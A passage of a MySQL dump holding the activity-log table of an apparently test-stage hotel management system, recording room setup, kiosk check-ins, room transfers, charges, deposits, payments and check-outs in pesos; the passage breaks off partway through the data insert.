
/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
DROP TABLE IF EXISTS `activity_logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `activity_logs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `user_id` bigint unsigned NOT NULL,
  `activity` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=309 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `activity_logs` WRITE;
/*!40000 ALTER TABLE `activity_logs` DISABLE KEYS */;
INSERT INTO `activity_logs` VALUES (1,1,2,'Create Room','Created room 108','2025-11-18 14:30:46','2025-11-18 14:30:46'),(2,1,2,'Create Room','Created room 117','2025-11-18 14:31:07','2025-11-18 14:31:07'),(3,1,2,'Create Room','Created room 119','2025-11-18 14:31:23','2025-11-18 14:31:23'),(4,1,2,'Create Room','Created room 300','2025-11-18 14:32:17','2025-11-18 14:32:17'),(5,1,2,'Create Frontdesk','Created frontdesk Bhong','2025-11-18 14:36:36','2025-11-18 14:36:36'),(6,1,2,'Create Category','Created category Snacks','2025-11-18 14:37:02','2025-11-18 14:37:02'),(7,1,2,'Create Category','Created category Drinks','2025-11-18 14:37:08','2025-11-18 14:37:08'),(8,1,2,'Update Room','Updated room 25','2025-11-18 14:39:14','2025-11-18 14:39:14'),(9,1,2,'Update Room','Updated room 30','2025-11-18 14:39:24','2025-11-18 14:39:24'),(10,1,2,'Update Room','Updated room 11','2025-11-18 14:39:34','2025-11-18 14:39:34'),(11,1,2,'Update Room','Updated room 15','2025-11-18 14:39:45','2025-11-18 14:39:45'),(12,1,2,'Update Room','Updated room 108','2025-11-18 14:39:57','2025-11-18 14:39:57'),(13,1,2,'Update Room','Updated room 117','2025-11-18 14:40:08','2025-11-18 14:40:08'),(14,1,2,'Update Room','Updated room 119','2025-11-18 14:40:21','2025-11-18 14:40:21'),(15,1,2,'Update Room','Updated room 200','2025-11-18 14:40:33','2025-11-18 14:40:33'),(16,1,2,'Update Room','Updated room 201','2025-11-18 14:40:40','2025-11-18 14:40:40'),(17,1,2,'Update Room','Updated room 300','2025-11-18 14:40:49','2025-11-18 14:40:49'),(18,1,2,'Create Menu','Created menu Chippy','2025-11-18 14:43:21','2025-11-18 14:43:21'),(19,1,2,'Create Menu','Created menu Nissin Cup Noodles','2025-11-18 14:44:13','2025-11-18 14:44:13'),(20,1,2,'Add Inventory','Added inventory for menu Chippy','2025-11-18 14:44:30','2025-11-18 14:44:30'),(21,1,2,'Add Inventory','Added inventory for menu Nissin Cup Noodles','2025-11-18 14:44:34','2025-11-18 14:44:34'),(22,1,2,'Create Menu','Created menu Coke Zero','2025-11-18 15:00:09','2025-11-18 15:00:09'),(23,1,2,'Create Menu','Created menu C2','2025-11-18 15:00:44','2025-11-18 15:00:44'),(24,1,2,'Create Menu','Created menu Nature\'s Spring 10ML','2025-11-18 15:02:15','2025-11-18 15:02:15'),(25,1,2,'Create Frontdesk','Created frontdesk Tan','2025-11-18 15:02:29','2025-11-18 15:02:29'),(26,1,3,'Check In from Kiosk','Checked in guest Marie Dela Cruz from kiosk','2025-11-18 15:02:45','2025-11-18 15:02:45'),(27,1,3,'Check In from Kiosk','Checked in guest Pie Tzu from kiosk','2025-11-18 15:02:56','2025-11-18 15:02:56'),(28,1,3,'Check In from Kiosk','Checked in guest Jose Pru from kiosk','2025-11-18 15:03:12','2025-11-18 15:03:12'),(29,1,3,'Check In from Kiosk','Checked in guest Ela Ziu from kiosk','2025-11-18 15:03:40','2025-11-18 15:03:40'),(30,1,3,'Check In from Kiosk','Checked in guest Kian Lee from kiosk','2025-11-18 15:05:07','2025-11-18 15:05:07'),(31,1,3,'Check In from Kiosk','Checked in guest Shein Tan from kiosk','2025-11-18 15:05:29','2025-11-18 15:05:29'),(32,1,3,'Check In from Kiosk','Checked in guest Carie Perry from kiosk','2025-11-18 15:05:38','2025-11-18 15:05:38'),(33,1,3,'Check In from Kiosk','Checked in guest Inna Liu from kiosk','2025-11-18 15:05:46','2025-11-18 15:05:46'),(34,1,3,'Check In from Kiosk','Checked in guest Ella Cy from kiosk','2025-11-18 15:05:58','2025-11-18 15:05:58'),(35,1,3,'Check In from Kiosk','Checked in guest Ariel Lee from kiosk','2025-11-18 15:06:24','2025-11-18 15:06:24'),(36,1,3,'Add Amenities','Added new amenities of ₱20 for guest Marie Dela Cruz','2025-11-18 15:07:35','2025-11-18 15:07:35'),(37,1,3,'Add Amenities','Added new amenities of ₱40 for guest Marie Dela Cruz','2025-11-18 15:08:02','2025-11-18 15:08:02'),(38,1,2,'Add Inventory','Added inventory for menu Coke Zero','2025-11-18 15:08:51','2025-11-18 15:08:51'),(39,1,2,'Add Inventory','Added inventory for menu C2','2025-11-18 15:08:55','2025-11-18 15:08:55'),(40,1,2,'Add Inventory','Added inventory for menu Nature\'s Spring 10ML','2025-11-18 15:08:58','2025-11-18 15:08:58'),(41,1,3,'Add Food and Beverages','Added new food and beverages of ₱10 for guest Marie Dela Cruz','2025-11-18 15:12:37','2025-11-18 15:12:37'),(42,1,3,'Add Food and Beverages','Added new food and beverages of ₱15 for guest Marie Dela Cruz','2025-11-18 15:13:15','2025-11-18 15:13:15'),(43,1,3,'Add Damage Charges','Added new damage charges of ₱200 for guest Marie Dela Cruz','2025-11-18 15:13:51','2025-11-18 15:13:51'),(44,1,3,'Add Damage Charges','Added new damage charges of ₱300 for guest Marie Dela Cruz','2025-11-18 15:14:29','2025-11-18 15:14:29'),(45,1,3,'Add Deposit','Added new deposit of ₱1000 for guest Marie Dela Cruz','2025-11-18 15:14:55','2025-11-18 15:14:55'),(46,1,3,'Add Amenities','Added new amenities of ₱20 for guest Pie Tzu','2025-11-18 15:16:27','2025-11-18 15:16:27'),(47,1,3,'Add Damage Charges','Added new damage charges of ₱500 for guest Pie Tzu','2025-11-18 15:17:05','2025-11-18 15:17:05'),(48,1,3,'Add Damage Charges','Added new damage charges of ₱130 for guest Jose Pru','2025-11-18 15:18:18','2025-11-18 15:18:18'),(49,1,3,'Add Damage Charges','Added new damage charges of ₱5000 for guest Jose Pru','2025-11-18 15:18:31','2025-11-18 15:18:31'),(50,1,3,'Add Food and Beverages','Added new food and beverages of ₱10 for guest Ela Ziu','2025-11-18 15:19:27','2025-11-18 15:19:27'),(51,1,3,'Add Damage Charges','Added new damage charges of ₱500 for guest Ela Ziu','2025-11-18 15:19:40','2025-11-18 15:19:40'),(52,1,3,'Add Extension','Added new extension of ₱1172 for guest Kian Lee','2025-11-18 15:20:56','2025-11-18 15:20:56'),(53,1,3,'Add Food and Beverages','Added new food and beverages of ₱30 for guest Kian Lee','2025-11-18 15:21:17','2025-11-18 15:21:17'),(54,1,3,'Add Damage Charges','Added new damage charges of ₱500 for guest Kian Lee','2025-11-18 15:21:35','2025-11-18 15:21:35'),(55,1,3,'Add Extension','Added new extension of ₱1060 for guest Shein Tan','2025-11-18 15:22:35','2025-11-18 15:22:35'),(56,1,3,'Add Food and Beverages','Added new food and beverages of ₱15 for guest Shein Tan','2025-11-18 15:23:46','2025-11-18 15:23:46'),(57,1,3,'Add Deposit','Added new deposit of ₱500 for guest Shein Tan','2025-11-18 15:24:07','2025-11-18 15:24:07'),(58,1,3,'Add Extension','Added new extension of ₱200 for guest Carie Perry','2025-11-18 15:26:02','2025-11-18 15:26:02'),(59,1,3,'Add Food and Beverages','Added new food and beverages of ₱15 for guest Carie Perry','2025-11-18 15:26:28','2025-11-18 15:26:28'),(60,1,3,'Add Deposit','Added new deposit of ₱1000 for guest Carie Perry','2025-11-18 15:27:01','2025-11-18 15:27:01'),(61,1,3,'Add Extension','Added new extension of ₱200 for guest Inna Liu','2025-11-18 15:27:55','2025-11-18 15:27:55'),(62,1,3,'Add Food and Beverages','Added new food and beverages of ₱30 for guest Inna Liu','2025-11-18 15:28:13','2025-11-18 15:28:13'),(63,1,3,'Add Deposit','Added new deposit of ₱2000 for guest Inna Liu','2025-11-18 15:28:32','2025-11-18 15:28:32'),(64,1,3,'Add Extension','Added new extension of ₱1116 for guest Ella Cy','2025-11-18 15:29:21','2025-11-18 15:29:21'),(65,1,3,'Add Food and Beverages','Added new food and beverages of ₱10 for guest Ella Cy','2025-11-18 15:29:45','2025-11-18 15:29:45'),(66,1,3,'Add Deposit','Added new deposit of ₱5000 for guest Ella Cy','2025-11-18 15:30:23','2025-11-18 15:30:23'),(67,1,3,'Add Extension','Added new extension of ₱716 for guest Ariel Lee','2025-11-18 15:34:56','2025-11-18 15:34:56'),(68,1,3,'Add Food and Beverages','Added new food and beverages of ₱15 for guest Ariel Lee','2025-11-18 15:36:01','2025-11-18 15:36:01'),(69,1,3,'Add Deposit','Added new deposit of ₱1000 for guest Ariel Lee','2025-11-18 15:36:34','2025-11-18 15:36:34'),(70,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest Jose Pru','2025-11-18 15:38:58','2025-11-18 15:38:58'),(71,1,3,'Check Out','Checked out guest Jose Pru from Room #11','2025-11-18 15:39:06','2025-11-18 15:39:06'),(72,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest Ela Ziu','2025-11-18 15:39:25','2025-11-18 15:39:25'),(73,1,3,'Check Out','Checked out guest Ela Ziu from Room #15','2025-11-18 15:39:29','2025-11-18 15:39:29'),(74,1,2,'Update Roomboy Designation','Updated roomboy designation for Roomboy','2025-11-18 15:40:23','2025-11-18 15:40:23'),(75,1,3,'Payment with Deposit','Payment of ₱585 with deposit for guest Marie Dela Cruz','2025-11-19 08:48:12','2025-11-19 08:48:12'),(76,1,3,'Check Out','Checked out guest Marie Dela Cruz from Room #25','2025-11-19 08:48:52','2025-11-19 08:48:52'),(77,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest Pie Tzu','2025-11-19 08:49:24','2025-11-19 08:49:24'),(78,1,3,'Check Out','Checked out guest Pie Tzu from Room #30','2025-11-19 08:49:32','2025-11-19 08:49:32'),(79,1,3,'Payment with Deposit','Payment of ₱215 with deposit for guest Carie Perry','2025-11-19 08:51:01','2025-11-19 08:51:01'),(80,1,3,'Check Out','Checked out guest Carie Perry from Room #119','2025-11-19 08:51:13','2025-11-19 08:51:13'),(81,1,3,'Payment with Deposit','Payment of ₱230 with deposit for guest Inna Liu','2025-11-19 08:52:27','2025-11-19 08:52:27'),(82,1,3,'Check Out','Checked out guest Inna Liu from Room #200','2025-11-19 08:52:40','2025-11-19 08:52:40'),(83,1,3,'Check In from Kiosk','Checked in guest test1 from kiosk','2025-11-19 09:42:32','2025-11-19 09:42:32'),(84,1,3,'Check Out','Checked out guest test1 from Room #11','2025-11-19 09:56:52','2025-11-19 09:56:52'),(85,1,2,'Create User','Created user test','2025-11-19 15:05:00','2025-11-19 15:05:00'),(86,1,9,'Check In from Kiosk','Checked in guest testing lang from kiosk','2025-11-19 15:07:03','2025-11-19 15:07:03'),(87,1,2,'Update Room','Updated room 15','2025-11-19 15:37:14','2025-11-19 15:37:14'),(88,1,3,'Check In from Kiosk','Checked in guest tan from kiosk','2025-11-19 15:38:37','2025-11-19 15:38:37'),(89,1,3,'Check Out','Checked out guest tan from Room #15','2025-11-19 15:39:05','2025-11-19 15:39:05'),(90,1,2,'Update Room','Updated room 15','2025-11-19 15:58:54','2025-11-19 15:58:54'),(91,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest Kian Lee','2025-11-20 08:52:44','2025-11-20 08:52:44'),(92,1,3,'Check Out','Checked out guest Kian Lee from Room #108','2025-11-20 08:52:48','2025-11-20 08:52:48'),(93,1,3,'Payment with Deposit','Payment of ₱731 with deposit for guest Ariel Lee','2025-11-20 09:00:00','2025-11-20 09:00:00'),(94,1,3,'Check Out','Checked out guest Ariel Lee from Room #300','2025-11-20 09:00:13','2025-11-20 09:00:13'),(95,1,3,'Check Out','Checked out guest testing lang from Room #119','2025-11-20 09:00:19','2025-11-20 09:00:19'),(96,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest Shein Tan','2025-11-20 09:00:34','2025-11-20 09:00:34'),(97,1,3,'Check Out','Checked out guest Shein Tan from Room #117','2025-11-20 09:02:13','2025-11-20 09:02:13'),(98,1,3,'Payment with Deposit','Payment of ₱1126 with deposit for guest Ella Cy','2025-11-20 09:02:57','2025-11-20 09:02:57'),(99,1,3,'Check Out','Checked out guest Ella Cy from Room #201','2025-11-20 09:03:00','2025-11-20 09:03:00'),(100,1,3,'Check In from Kiosk','Checked in guest zydie from kiosk','2025-11-20 09:49:06','2025-11-20 09:49:06'),(101,1,3,'Room Transfer','Guest zydie transferred from Room #25 to Room #1','2025-11-20 09:52:33','2025-11-20 09:52:33'),(102,1,3,'Payment with Deposit','Payment of ₱0 with deposit for guest zydie','2025-11-20 09:52:38','2025-11-20 09:52:38'),(103,1,3,'Add Extension','Added new extension of ₱200 for guest zydie','2025-11-20 09:53:30','2025-11-20 09:53:30'),(104,1,3,'Add Damage Charges','Added new damage charges of ₱400 for guest zydie','2025-11-20 10:01:06','2025-11-20 10:01:06'),(105,1,3,'Add Deposit','Added new deposit of ₱1000 for guest zydie','2025-11-20 10:02:41','2025-11-20 10:02:41'),(106,1,3,'Add Food and Beverages','Added new food and beverages of ₱10 for guest zydie','2025-11-20 10:03:12','2025-11-20 10:03:12'),(107,1,3,'Add Damage Charges','Added new damage charges of ₱1000 for guest zydie','2025-11-20 10:05:10','2025-11-20 10:05:10'),(108,1,3,'Payment with Deposit','Payment of ₱1000 with deposit for guest zydie','2025-11-20 10:05:18','2025-11-20 10:05:18'),(109,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest zydie','2025-11-20 10:13:48','2025-11-20 10:13:48'),(110,1,3,'Check Out','Checked out guest zydie from Room #1','2025-11-20 10:14:04','2025-11-20 10:14:04'),(111,1,3,'Check In from Kiosk','Checked in guest zydiiie from kiosk','2025-11-20 10:17:22','2025-11-20 10:17:22'),(112,1,3,'Check In from Kiosk','Checked in guest Nino from kiosk','2025-11-20 10:17:40','2025-11-20 10:17:40'),(113,1,3,'Room Transfer','Guest zydiiie transferred from Room #30 to Room #16','2025-11-20 10:19:12','2025-11-20 10:19:12'),(114,1,3,'Add Deposit','Added new deposit of ₱500 for guest zydiiie','2025-11-20 10:19:51','2025-11-20 10:19:51'),(115,1,3,'Add Food and Beverages','Added new food and beverages of ₱30 for guest zydiiie','2025-11-20 10:20:54','2025-11-20 10:20:54'),(116,1,3,'Payment with Deposit','Payment of ₱30 with deposit for guest zydiiie','2025-11-20 10:21:17','2025-11-20 10:21:17'),(117,1,3,'Add Food and Beverages','Added new food and beverages of ₱45 for guest zydiiie','2025-11-20 10:21:38','2025-11-20 10:21:38'),(118,1,3,'Room Transfer','Guest Nino transferred from Room #108 to Room #290','2025-11-20 10:21:48','2025-11-20 10:21:48'),(119,1,3,'Payment with Deposit','Payment of ₱45 with deposit for guest zydiiie','2025-11-20 10:22:00','2025-11-20 10:22:00'),(120,1,3,'Add Food and Beverages','Added new food and beverages of ₱60 for guest zydiiie','2025-11-20 10:22:55','2025-11-20 10:22:55'),(121,1,3,'Add Food and Beverages','Added new food and beverages of ₱750 for guest Nino','2025-11-20 10:23:11','2025-11-20 10:23:11'),(122,1,3,'Payment','Payment of ₱100 for guest zydiiie','2025-11-20 10:23:16','2025-11-20 10:23:16'),(123,1,3,'Add Food and Beverages','Added new food and beverages of ₱30 for guest Nino','2025-11-20 10:24:07','2025-11-20 10:24:07'),(124,1,3,'Add Damage Charges','Added new damage charges of ₱130 for guest zydiiie','2025-11-20 10:24:21','2025-11-20 10:24:21'),(125,1,3,'Payment with Deposit','Payment of ₱30 with deposit for guest Nino','2025-11-20 10:24:45','2025-11-20 10:24:45'),(126,1,3,'Add Food and Beverages','Added new food and beverages of ₱20 for guest zydiiie','2025-11-20 10:25:32','2025-11-20 10:25:32'),(127,1,3,'Payment with Deposit','Payment of ₱20 with deposit for guest zydiiie','2025-11-20 10:25:54','2025-11-20 10:25:54'),(128,1,3,'Add Deposit','Added new deposit of ₱1000 for guest Nino','2025-11-20 10:28:09','2025-11-20 10:28:09'),(129,1,3,'Payment with Deposit','Payment of ₱130 with deposit for guest zydiiie','2025-11-20 10:29:38','2025-11-20 10:29:38'),(130,1,3,'Add Food and Beverages','Added new food and beverages of ₱45 for guest Nino','2025-11-20 10:29:59','2025-11-20 10:29:59'),(131,1,3,'Add Extension','Added new extension of ₱100 for guest zydiiie','2025-11-20 10:30:23','2025-11-20 10:30:23'),(132,1,3,'Payment with Deposit','Payment of ₱45 with deposit for guest Nino','2025-11-20 10:30:30','2025-11-20 10:30:30'),(133,1,3,'Add Extension','Added new extension of ₱100 for guest zydiiie','2025-11-20 10:30:43','2025-11-20 10:30:43'),(134,1,3,'Add Extension','Added new extension of ₱436 for guest zydiiie','2025-11-20 10:31:24','2025-11-20 10:31:24'),(135,1,3,'Add Extension','Added new extension of ₱400 for guest zydiiie','2025-11-20 10:31:51','2025-11-20 10:31:51'),(136,1,3,'Payment with Deposit','Payment of ₱750 with deposit for guest Nino','2025-11-20 10:32:16','2025-11-20 10:32:16'),(137,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest zydiiie','2025-11-20 10:34:29','2025-11-20 10:34:29'),(138,1,3,'Add Damage Charges','Added new damage charges of ₱400 for guest Nino','2025-11-20 10:34:32','2025-11-20 10:34:32'),(139,1,3,'Add Amenities','Added new amenities of ₱400 for guest zydiiie','2025-11-20 10:34:48','2025-11-20 10:34:48'),(140,1,3,'Add Deposit','Added new deposit of ₱500 for guest zydiiie','2025-11-20 10:35:01','2025-11-20 10:35:01'),(141,1,3,'Add Food and Beverages','Added new food and beverages of ₱120 for guest Nino','2025-11-20 10:35:06','2025-11-20 10:35:06'),(142,1,3,'Payment with Deposit','Payment of ₱120 with deposit for guest Nino','2025-11-20 10:35:39','2025-11-20 10:35:39'),(143,1,3,'Add Damage Charges','Added new damage charges of ₱5000 for guest zydiiie','2025-11-20 10:36:04','2025-11-20 10:36:04'),(144,1,3,'Add Amenities','Added new amenities of ₱100 for guest Nino','2025-11-20 10:36:10','2025-11-20 10:36:10'),(145,1,3,'Payment with Deposit','Payment of ₱100 with deposit for guest Nino','2025-11-20 10:36:20','2025-11-20 10:36:20'),(146,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest zydiiie','2025-11-20 10:37:16','2025-11-20 10:37:16'),(147,1,3,'Add Extension','Added new extension of ₱200 for guest Nino','2025-11-20 10:38:13','2025-11-20 10:38:13'),(148,1,3,'Payment with Deposit','Payment of ₱200 with deposit for guest Nino','2025-11-20 10:38:45','2025-11-20 10:38:45'),(149,1,3,'Add Food and Beverages','Added new food and beverages of ₱120 for guest Nino','2025-11-20 10:39:24','2025-11-20 10:39:24'),(150,1,3,'Add Deposit','Added new deposit of ₱13 for guest Nino','2025-11-20 10:39:58','2025-11-20 10:39:58'),(151,1,3,'Payment with Deposit','Payment of ₱120 with deposit for guest Nino','2025-11-20 10:40:05','2025-11-20 10:40:05'),(152,1,3,'Check Out','Checked out guest zydiiie from Room #16','2025-11-20 10:43:55','2025-11-20 10:43:55'),(153,1,3,'Add Extension','Added new extension of ₱648 for guest Nino','2025-11-20 10:45:32','2025-11-20 10:45:32'),(154,1,3,'Add Extension','Added new extension of ₱100 for guest Nino','2025-11-20 10:46:03','2025-11-20 10:46:03'),(155,1,3,'Check In from Kiosk','Checked in guest test from kiosk','2025-11-20 10:55:17','2025-11-20 10:55:17'),(156,1,3,'Check In from Kiosk','Checked in guest t2 from kiosk','2025-11-20 10:55:52','2025-11-20 10:55:52'),(157,1,3,'Add Food and Beverages','Added new food and beverages of ₱30 for guest test','2025-11-20 10:57:54','2025-11-20 10:57:54'),(158,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest Nino','2025-11-20 10:58:02','2025-11-20 10:58:02'),(159,1,3,'Payment with Deposit','Payment of ₱30 with deposit for guest test','2025-11-20 10:58:18','2025-11-20 10:58:18'),(160,1,3,'Check Out','Checked out guest Nino from Room #290','2025-11-20 10:59:39','2025-11-20 10:59:39'),(161,1,3,'Deduct Deposit','Deducted deposit of ₱210 for guest test','2025-11-20 11:00:09','2025-11-20 11:00:09'),(162,1,3,'Check In from Kiosk','Checked in guest t3 from kiosk','2025-11-20 11:10:24','2025-11-20 11:10:24'),(163,1,3,'Check In from Kiosk','Checked in guest t4 from kiosk','2025-11-20 11:10:53','2025-11-20 11:10:53'),(164,1,3,'Check In from Kiosk','Checked in guest t5 from kiosk','2025-11-20 11:11:19','2025-11-20 11:11:19'),(165,1,3,'Add Food and Beverages','Added new food and beverages of ₱30 for guest t3','2025-11-20 11:13:51','2025-11-20 11:13:51'),(166,1,3,'Add Food and Beverages','Added new food and beverages of ₱20 for guest t3','2025-11-20 11:14:01','2025-11-20 11:14:01'),(167,1,3,'Payment with Deposit','Payment of ₱50 with deposit for guest t3','2025-11-20 11:14:13','2025-11-20 11:14:13'),(168,1,3,'Add Extension','Added new extension of ₱492 for guest t2','2025-11-20 11:15:55','2025-11-20 11:15:55'),(169,1,3,'Deduct Deposit','Deducted deposit of ₱414 for guest t3','2025-11-20 11:15:56','2025-11-20 11:15:56'),(170,1,3,'Check Out','Checked out guest t3 from Room #25','2025-11-20 11:16:03','2025-11-20 11:16:03'),(171,1,3,'Room Transfer','Guest t5 transferred from Room #200 to Room #4','2025-11-20 11:16:18','2025-11-20 11:16:18'),(172,1,3,'Add Food and Beverages','Added new food and beverages of ₱270 for guest t2','2025-11-20 11:21:33','2025-11-20 11:21:33'),(173,1,3,'Add Deposit','Added new deposit of ₱1000 for guest t2','2025-11-20 11:22:09','2025-11-20 11:22:09'),(174,1,3,'Add Deposit','Added new deposit of ₱500 for guest t4','2025-11-20 11:23:08','2025-11-20 11:23:08'),(175,1,3,'Add Damage Charges','Added new damage charges of ₱150 for guest t4','2025-11-20 11:23:21','2025-11-20 11:23:21'),(176,1,3,'Room Transfer','Guest t5 transferred from Room #4 to Room #236','2025-11-20 11:23:43','2025-11-20 11:23:43'),(177,1,3,'Add Damage Charges','Added new damage charges of ₱40 for guest t4','2025-11-20 11:23:43','2025-11-20 11:23:43'),(178,1,3,'Payment with Deposit','Payment of ₱40 with deposit for guest t4','2025-11-20 11:23:47','2025-11-20 11:23:47'),(179,1,3,'Payment with Deposit','Payment of ₱150 with deposit for guest t4','2025-11-20 11:24:13','2025-11-20 11:24:13'),(180,1,3,'Room Transfer','Guest t5 transferred from Room #236 to Room #23','2025-11-20 11:25:27','2025-11-20 11:25:27'),(181,1,3,'Room Transfer','Guest t4 transferred from Room #15 to Room #19','2025-11-20 11:27:36','2025-11-20 11:27:36'),(182,1,3,'Room Transfer','Guest t4 transferred from Room #19 to Room #19','2025-11-20 11:28:04','2025-11-20 11:28:04'),(183,1,3,'Payment with Deposit','Payment of ₱270 with deposit for guest t2','2025-11-20 11:29:36','2025-11-20 11:29:36'),(184,1,3,'Add Extension','Added new extension of ₱772 for guest t5','2025-11-20 12:01:54','2025-11-20 12:01:54'),(185,1,3,'Room Transfer','Guest t4 transferred from Room #19 to Room #10','2025-11-20 12:02:09','2025-11-20 12:02:09'),(186,1,3,'Room Transfer','Guest t4 transferred from Room #10 to Room #10','2025-11-20 12:02:50','2025-11-20 12:02:50'),(187,1,3,'Payment','Payment of ₱800 for guest t5','2025-11-20 12:05:09','2025-11-20 12:05:09'),(188,1,3,'Payment','Payment of ₱800 for guest t5','2025-11-20 12:05:09','2025-11-20 12:05:09'),(189,1,3,'Payment','Payment of ₱800 for guest t5','2025-11-20 12:05:09','2025-11-20 12:05:09'),(190,1,3,'Payment','Payment of ₱800 for guest t5','2025-11-20 12:05:09','2025-11-20 12:05:09'),(191,1,3,'Deduct Deposit','Deducted deposit of ₱310 for guest t4','2025-11-20 12:05:41','2025-11-20 12:05:41'),(192,1,3,'Add Amenities','Added new amenities of ₱200 for guest t5','2025-11-20 12:54:58','2025-11-20 12:54:58'),(193,1,3,'Add Food and Beverages','Added new food and beverages of ₱450 for guest t5','2025-11-20 12:55:40','2025-11-20 12:55:40'),(194,1,3,'Add Food and Beverages','Added new food and beverages of ₱2460 for guest t4','2025-11-20 12:56:29','2025-11-20 12:56:29'),(195,1,3,'Add Damage Charges','Added new damage charges of ₱500 for guest t5','2025-11-20 12:57:39','2025-11-20 12:57:39'),(196,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest t4','2025-11-20 12:57:40','2025-11-20 12:57:40'),(197,1,3,'Add Extension','Added new extension of ₱200 for guest t5','2025-11-20 12:58:00','2025-11-20 12:58:00'),(198,1,3,'Add Extension','Added new extension of ₱100 for guest t4','2025-11-20 12:58:17','2025-11-20 12:58:17'),(199,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest t4','2025-11-20 12:58:32','2025-11-20 12:58:32'),(200,1,3,'Add Extension','Added new extension of ₱100 for guest t4','2025-11-20 12:58:54','2025-11-20 12:58:54'),(201,1,3,'Pay All Unpaid Balances','All unpaid balances are paid for guest t4','2025-11-20 12:58:58','2025-11-20 12:58:58'),(202,1,3,'Check Out','Checked out guest t4 from Room #10','2025-11-20 13:11:54','2025-11-20 13:11:54'),(203,1,2,'Add Inventory','Added inventory for menu Nissin Cup Noodles','2025-11-20 13:15:28','2025-11-20 13:15:28'),(204,1,2,'Update Room','Updated room 10','2025-11-20 13:15:46','2025-11-20 13:15:46'),(205,1,2,'Add Inventory','Added inventory for menu Coke Zero','2025-11-20 13:17:30','2025-11-20 13:17:30'),(206,1,3,'Check In from Kiosk','Checked in guest nenyu from kiosk','2025-11-20 13:19:32','2025-11-20 13:19:32'),(207,1,3,'Check Out','Checked out guest test from Room #119','2025-11-20 13:28:47','2025-11-20 13:28:47'),(208,1,3,'Check In from Kiosk','Checked in guest test from kiosk','2025-11-20 14:11:29','2025-11-20 14:11:29'),(209,1,3,'Payment','Payment of ₱200 for guest t5','2025-11-20 14:23:02','2025-11-20 14:23:02'),(210,1,3,'Add Deposit','Added new deposit of ₱500 for guest t5','2025-11-20 14:23:40','2025-11-20 14:23:40'),(211,1,3,'Payment with Deposit','Payment of ₱500 with deposit for guest t5','2025-11-20 14:23:55','2025-11-20 14:23:55'),(212,1,3,'Room Transfer','Guest thian transferred from Room #30 to Room #101','2025-11-20 14:23:56','2025-11-20 14:23:56'),(213,1,3,'Add Deposit','Added new deposit of ₱1000 for guest test','2025-11-20 14:27:38','2025-11-20 14:27:38'),(214,1,3,'Add Damage Charges','Added new damage charges of ₱1000 for guest test','2025-11-20 14:44:11','2025-11-20 14:44:11'),(215,1,3,'Payment with Deposit','Payment of ₱1000 with deposit for guest test','2025-11-20 14:44:24','2025-11-20 14:44:24'),(216,1,3,'Add Deposit','Added new deposit of ₱2002 for guest test','2025-11-20 14:45:18','2025-11-20 14:45:18'),(217,1,3,'Room Transfer','Guest test transferred from Room #1 to Room #124','2025-11-20 14:46:15','2025-11-20 14:46:15'),(218,1,3,'Add Damage Charges','Added new damage charges of ₱5000 for guest test','2025-11-20 14:48:12','2025-11-20 14:48:12'),(219,1,3,'Add Deposit','Added new deposit of ₱4000 for guest test','2025-11-20 14:49:29','2025-11-20 14:49:29'),(220,1,3,'Payment with Deposit','Payment of ₱5000 with deposit for guest test','2025-11-20 14:50:32','2025-11-20 14:50:32'),(221,1,3,'Add Deposit','Added new deposit of ₱1000 for guest test','2025-11-20 14:51:15','2025-11-20 14:51:15'),(222,1,3,'Add Damage Charges','Added new damage charges of ₱1000 for guest test','2025-11-20 14:52:46','2025-11-20 14:52:46'),(223,1,3,'Payment with Deposit','Payment of ₱1000 with deposit for guest test','2025-11-20 14:53:08','2025-11-20 14:53:08'),(224,1,3,'Payment with Deposit','Payment of ₱1000 with deposit for guest test','2025-11-20 14:53:08','2025-11-20 14:53:08'),(225,1,3,'Add Deposit','Added new deposit of ₱1000 for guest test','2025-11-20 14:55:18','2025-11-20 14:55:18'),(226,1,3,'Add Food and Beverages','Added new food and beverages of ₱50 for guest test','2025-11-20 14:55:42','2025-11-20 14:55:42'),(227,1,3,'Add Amenities','Added new amenities of ₱60 for guest test','2025-11-20 14:56:10','2025-11-20 14:56:10'),(228,1,3,'Add Food and Beverages','Added new food and beverages of ₱75 for guest test','2025-11-20 15:01:36','2025-11-20 15:01:36'),(229,1,3,'Add Food and Beverages','Added new food and beverages of ₱60 for guest test','2025-11-20 15:28:23','2025-11-20 15:28:23'),(230,1,3,'Payment','Payment of ₱60 for guest test','2025-11-20 15:28:36','2025-11-20 15:28:36'),(231,1,3,'Add 